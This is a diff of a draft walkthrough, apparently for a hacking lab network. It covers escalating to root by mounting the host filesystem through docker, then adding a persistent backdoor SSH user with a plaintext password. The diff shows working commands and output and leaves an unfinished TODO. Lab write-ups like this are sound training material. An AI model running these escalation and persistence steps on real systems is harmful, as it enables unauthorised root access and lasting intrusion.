@@ -1078,7 +1078,8 @@ Again I performed the usual step to privilege escalation. This time looking for 
     /usr/bin/docker
     ...
 
-Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). I took me a while to realize what is this alpine value used in the sample command: that is the name of a running docker image:tag
+Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). We can try a so-called docker escape tecnique to elevate to root.
+I took me a while to realize what is this alpine value used in the sample command, that is the name of a running docker image:tag
 We can search for running docker images as follows:
 
     docker images -a
@@ -1089,18 +1090,61 @@ We can search for running docker images as follows:
 
 The last result row is the one we can use as value for the parameter. The command should return a shel with root privilege:
 
-    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
     the input device is not a TTY
 Investigating the error, since our current shell is not a full TTY, the solution is to get rid of the t option. So the command to exploit it is:
 
-    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
+    docker run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt bash
     <r run -v /:/mnt --rm -i ubuntu:18.04 chroot /mnt sh
     id
     uid=0(root) gid=0(root) groups=0(root)
 
-[HERE] --> Hashcat shadow
+Since ssh is enabled I decided to create a new user to have a persistent access to the system:
+
+    useradd -M support-it
+    passwd support-it
+    New password: Pwd1234
+    Retype new password: Pwd1234
+    passwd: password updated successfully
+
+Then we can login with ssh using the host IP, so we don't to use the ligolo tunnell anymore:
+
+    sh support-it@10.200.95.33
+    ...
+    Could not chdir to home directory /home/support-it: No such file or directory
+    $ /bin/bash
+    support-it@ip-10-200-95-33:/$ 
+
+Again we can take advantage of the docker suid vulnearbility to add another user with root privileges to the box. First get the root shell:
+
+    docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt bash
+                .-/+oossssoo+/-.               root@0acf73a8ca6d 
+            `:+ssssssssssssssssss+:`           -----------------                                                                                                                           
+          -+ssssssssssssssssssyyssss+-         OS: Ubuntu 20.04.1 LTS x86_64                                                                                                               
+        .ossssssssssssssssssdMMMNysssso.       Host: HVM domU 4.11.amazon                                                                                                                  
+       /ssssssssssshdmmNNmmyNMMMMhssssss/      Kernel: 5.4.0-1030-aws                                                                                                                      
+      +ssssssssshmydMMMMMMMNddddyssssssss+     Uptime: 2 hours, 4 mins                                                                                                                     
+     /sssssssshNMMMyhhyyyyhmNMMMNhssssssss/    Packages: 709 (dpkg)                                                                                                                        
+    .ssssssssdMMMNhsssssssssshNMMMdssssssss.   Shell: bash 5.0.17                                                                                                                          
+    +sssshhhyNMMNyssssssssssssyNMMMysssssss+   CPU: Intel Xeon E5-2686 v4 (2) @ 2.299GHz                                                                                                   
+    ossyNMMMNyMMhsssssssssssssshmmmhssssssso   GPU: 00:02.0 Cirrus Logic GD 5446                                                                                                           
+    ossyNMMMNyMMhsssssssssssssshmmmhssssssso   Memory: 736MiB / 3933MiB                                                                                                                    
+    +sssshhhyNMMNyssssssssssssyNMMMysssssss+                                                                                                                                               
+    .ssssssssdMMMNhsssssssssshNMMMdssssssss.                                                                                                                                               
+     /sssssssshNMMMyhhyyyyhdNMMMNhssssssss/                                                                                                                                                
+      +sssssssssdmydMMMMMMMMddddyssssssss+                                                                                                                                                 
+       /ssssssssssshdmNNNNmyNMMMMhssssss/                                                                                                                                                  
+        .ossssssssssssssssssdMMMNysssso.                                                                                                                                                   
+          -+sssssssssssssssssyyyssss+-                                                                                                                                                     
+            `:+ssssssssssssssssss+:`                                                                                                                                                       
+                .-/+oossssoo+/-.                                                                                                                                                           
+
+    root@0acf73a8ca6d:/# 
+
+[TODO:explain]
 
 
+    
 
 From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:
 
